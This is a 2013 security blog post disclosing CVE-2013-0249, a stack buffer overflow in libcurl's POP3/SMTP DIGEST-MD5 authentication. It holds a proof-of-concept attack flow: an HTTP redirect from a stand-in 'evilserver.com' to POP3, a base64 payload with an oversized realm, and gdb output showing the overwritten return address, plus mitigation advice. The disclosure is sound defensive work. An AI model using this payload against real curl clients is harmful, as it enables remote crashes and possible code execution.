<!DOCTYPE html>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <title>
   Blog.Volema / cURL buffer overflow
  </title>
  <meta content="Volema team" name="author"/>
  <link href="./theme/css/main.css" rel="stylesheet" type="text/css"/>
  <link href="./theme/css/normalize.css" rel="stylesheet"/>
  <link href="http://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic" rel="stylesheet"/>
  <link href="./theme/css/screen.css" media="screen" rel="stylesheet"/>
  <link href="./theme/css/pygments.css" media="screen" rel="stylesheet"/>
  <!--[if lt IE 9]&gt;
		&lt;script src="//html5shim.googlecode.com/svn/trunk/html5.js"&gt;&lt;/script&gt;
	&lt;![endif]-->
  <link href="/feeds/all.atom.xml" rel="alternate" title="Blog.Volema ATOM Feed" type="application/atom+xml"/>
 </head>
 <body>
  <div id="wrapper">
   <header id="masterhead">
    <h1 id="header">
     <a href="http://blog.volema.com/">
      Blog.Volema
     </a>
    </h1>
    <nav>
     <a href="http://volema.com">
      Volema
     </a>
     -
     <a href="http://twitter.com/volemacom">
      Twitter
     </a>
     -
     <a href="/feeds/all.atom.xml">
      Feed
     </a>
    </nav>
    <div class="clear">
    </div>
   </header>
   <article class="post single">
    <header>
     <h3>
      
      <a class="link" href="#">
       cURL buffer overflow
      </a>
     </h3>
     <span class="date">
      Wed 06 February 2013
     </span>
    </header>
    <p>
    </p>
    <p>
     Volema found remotely exploitable buffer overflow vulnerability in libcurl POP3, SMTP protocol handlers which lead to code execution (RCE).
When negotiating SASL DIGEST-MD5 authentication, the function Curl_sasl_create_digest_md5_message() uses the data provided from the server
 without doing the proper length checks and that data is then appended to a local fixed-size buffer on the stack.
    </p>
    <p>
     Vendor
     <a href="http://curl.haxx.se/docs/adv_20130206.html">
      notified
     </a>
     , CVE-2013-0249 released.
    </p>
    <p>
     <strong>
      Attack Concept Outline
     </strong>
    </p>
    <p>
     We have the permissions to send custom HTTP requests with curl.
We send request to our http://evilserver.com/
    </p>
    <div class="codehilite">
     <pre>
      <span class="n">
       GET
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       HTTP
      </span>
      <span class="o">
       /
      </span>
      1
      <span class="p">
       .
      </span>
      0
      <span class="n">
       Host
      </span>
      <span class="p">
       :
      </span>
      <span class="n">
       evilserver
      </span>
      <span class="p">
       .
      </span>
      <span class="n">
       com
      </span>
     </pre>
    </div>
    <p>
     server answers with
    </p>
    <div class="codehilite">
     <pre>
      <span class="n">
       HTTP
      </span>
      <span class="o">
       /
      </span>
      1
      <span class="p">
       .
      </span>
      0 302
      <span class="n">
       Found
      </span>
      <span class="n">
       Location
      </span>
      <span class="p">
       :
      </span>
      <span class="n">
       pop3
      </span>
      <span class="p">
       :
      </span>
      <span class="o">
       //
      </span>
      <span class="n">
       x
      </span>
      <span class="p">
       :
      </span>
      <span class="n">
       x
      </span>
      <span class="p">
       @
      </span>
      <span class="n">
       evilserver
      </span>
      <span class="p">
       .
      </span>
      <span class="n">
       com
      </span>
      <span class="o">
       /
      </span>
      <span class="p">
       .
      </span>
     </pre>
    </div>
    <p>
     "smart" curl interpretes redirect and connects to evilserver.com port 110/TCP using POP3 proto.
Server answers
    </p>
    <div class="codehilite">
     <pre>
      <span class="o">
       +
      </span>
      <span class="n">
       OK
      </span>
      <span class="n">
       POP3
      </span>
      <span class="n">
       server
      </span>
      <span class="n">
       ready
      </span>
     </pre>
    </div>
    <p>
     curl sends
    </p>
    <div class="codehilite">
     <pre>
      <span class="n">
       CAPA
      </span>
     </pre>
    </div>
    <p>
     servers answers with DIGEST-MD5 only
    </p>
    <div class="codehilite">
     <pre>
      <span class="o">
       +
      </span>
      <span class="n">
       OK
      </span>
      <span class="n">
       List
      </span>
      <span class="n">
       of
      </span>
      <span class="n">
       capabilities
      </span>
      <span class="n">
       follows
      </span>
      <span class="n">
       SASL
      </span>
      <span class="n">
       DIGEST
      </span>
      <span class="o">
       -
      </span>
      <span class="n">
       MD5
      </span>
      <span class="n">
       IMPLEMENTATION
      </span>
      <span class="n">
       dumbydumb
      </span>
      <span class="n">
       POP3
      </span>
      <span class="n">
       server
      </span>
     </pre>
    </div>
    <p>
     so, libcurl has to send
    </p>
    <div class="codehilite">
     <pre>
      <span class="n">
       AUTH
      </span>
      <span class="n">
       DIGEST
      </span>
      <span class="o">
       -
      </span>
      <span class="n">
       MD5
      </span>
     </pre>
    </div>
    <p>
     then server sends the payload
    </p>
    <div class="codehilite">
     <pre>
      <span class="o">
       +
      </span>
      <span class="n">
       cmVhbG09IkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIixub25jZT0iT0E2TUc5dEVRR20yaGgiLHFvcD0iYXV0aCIsYWxnb3JpdGhtPW1kNS1zZXNzLGNoYXJzZXQ9dXRmLTg
      </span>
      <span class="p">
       =
      </span>
     </pre>
    </div>
    <p>
     and overflow happens because of fixed "uri" buffer size (128) and "realm" which is also 128 bytes
    </p>
    <div class="codehilite">
     <pre>
      <span class="n">
       realm
      </span>
      <span class="p">
       =
      </span>
      "
      <span class="n">
       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
      </span>
      "
      <span class="p">
       ,
      </span>
      <span class="n">
       nonce
      </span>
      <span class="p">
       =
      </span>
      "
      <span class="n">
       OA6MG9tEQGm2hh
      </span>
      "
      <span class="p">
       ,
      </span>
      <span class="n">
       qop
      </span>
      <span class="p">
       =
      </span>
      "
      <span class="n">
       auth
      </span>
      "
      <span class="p">
       ,
      </span>
      <span class="n">
       algorithm
      </span>
      <span class="p">
       =
      </span>
      <span class="n">
       md5
      </span>
      <span class="o">
       -
      </span>
      <span class="n">
       sess
      </span>
      <span class="p">
       ,
      </span>
      <span class="n">
       charset
      </span>
      <span class="p">
       =
      </span>
      <span class="n">
       utf
      </span>
      <span class="o">
       -
      </span>
      8
     </pre>
    </div>
    <p>
     how it looks in gdb
    </p>
    <div class="codehilite">
     <pre>
      <span class="n">
       Program
      </span>
      <span class="n">
       received
      </span>
      <span class="n">
       signal
      </span>
      <span class="n">
       SIGSEGV
      </span>
      <span class="p">
       ,
      </span>
      <span class="n">
       Segmentation
      </span>
      <span class="n">
       fault
      </span>
      <span class="p">
       .
      </span>
      0
      <span class="n">
       x00007fd2b238298d
      </span>
      <span class="n">
       in
      </span>
      ??
      <span class="p">
       ()
      </span>
      <span class="n">
       from
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       lib
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       x86_64
      </span>
      <span class="o">
       -
      </span>
      <span class="n">
       linux
      </span>
      <span class="o">
       -
      </span>
      <span class="n">
       gnu
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       libc
      </span>
      <span class="p">
       .
      </span>
      <span class="n">
       so
      </span>
      <span class="p">
       .
      </span>
      6
      <span class="p">
       (
      </span>
      <span class="n">
       gdb
      </span>
      <span class="p">
       )
      </span>
      <span class="n">
       bt
      </span>
      #0  0
      <span class="n">
       x00007fd2b238298d
      </span>
      <span class="n">
       in
      </span>
      ??
      <span class="p">
       ()
      </span>
      <span class="n">
       from
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       lib
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       x86_64
      </span>
      <span class="o">
       -
      </span>
      <span class="n">
       linux
      </span>
      <span class="o">
       -
      </span>
      <span class="n">
       gnu
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       libc
      </span>
      <span class="p">
       .
      </span>
      <span class="n">
       so
      </span>
      <span class="p">
       .
      </span>
      6
#1  0
      <span class="n">
       x00007fd2b2a5cc07
      </span>
      <span class="n">
       in
      </span>
      <span class="n">
       Curl_sasl_create_digest_md5_message
      </span>
      <span class="p">
       ()
      </span>
      <span class="n">
       from
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       home
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       kyprizel
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       test
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       curl
      </span>
      <span class="o">
       -
      </span>
      7
      <span class="p">
       .
      </span>
      28
      <span class="p">
       .
      </span>
      1
      <span class="o">
       /
      </span>
      <span class="n">
       lib
      </span>
      <span class="o">
       /
      </span>
      <span class="p">
       .
      </span>
      <span class="n">
       libs
      </span>
      <span class="o">
       /
      </span>
      <span class="n">
       libcurl
      </span>
      <span class="p">
       .
      </span>
      <span class="n">
       so
      </span>
      <span class="p">
       .
      </span>
      4
#2  0
      <span class="n">
       x4141414141414141
      </span>
      <span class="n">
       in
      </span>
      ??
      <span class="p">
       ()
      </span>
      <span class="p">
       ...
      </span>
      #1469 0
      <span class="n">
       x4141414141414141
      </span>
      <span class="n">
       in
      </span>
      ??
      <span class="p">
       ()
      </span>
      #1470 0
      <span class="n">
       x656d616e72657375
      </span>
      <span class="n">
       in
      </span>
      ??
      <span class="p">
       ()
      </span>
      <span class="n">
       Cannot
      </span>
      <span class="n">
       access
      </span>
      <span class="n">
       memory
      </span>
      <span class="n">
       at
      </span>
      <span class="n">
       address
      </span>
      0
      <span class="n">
       x7fff63b8b000
      </span>
     </pre>
    </div>
    <p>
     Original exploit:
     <a href="http://i.volema.com/pop3d.py">
      pop3d.py
     </a>
     .
    </p>
    <p>
     <strong>
      Mitigation
     </strong>
    </p>
    <p>
     We recommend to disable protocols other than HTTP(S) in your application using options CURLOPT_PROTOCOLS and CURLOPT_REDIR_PROTOCOLS.
libcurl version should be updated.
    </p>
    <!-- AddThis Button BEGIN -->
    <div class="addthis_toolbox addthis_default_style ">
     <a class="addthis_button_preferred_1">
     </a>
     <a class="addthis_button_preferred_2">
     </a>
     <a class="addthis_button_preferred_3">
     </a>
     <a class="addthis_button_preferred_4">
     </a>
     <a class="addthis_button_compact">
     </a>
     <a class="addthis_counter addthis_bubble_style">
     </a>
    </div>
    <script type="text/javascript">
     var addthis_config = {"data_track_addressbar":true};
    </script>
    <script src="http://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5070983a0e6a315e" type="text/javascript">
    </script>
    <!-- AddThis Button END -->
    <div class="comments">
     <h4>
      Comments !
     </h4>
     <div id="disqus_thread">
     </div>
     <script type="text/javascript">
      var disqus_identifier = "curl-rce.html";
       (function() {
       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
       dsq.src = 'http://volema.disqus.com/embed.js';
       (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      })();
     </script>
    </div>
   </article>
   <footer id="footer">
    <div class="grid">
     Copyright  2012  2013
    </div>
    <div class="gridright">
     <a class="twitter-follow-button" data-show-count="false" href="//twitter.com/volemacom">
      Follow @volemacom
     </a>
     <script>
      !function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");
     </script>
    </div>
    <div class="clear">
    </div>
   </footer>
  </div>
  <script type="text/javascript">
   var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-35383846-2']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
  </script>
 </body>
</html>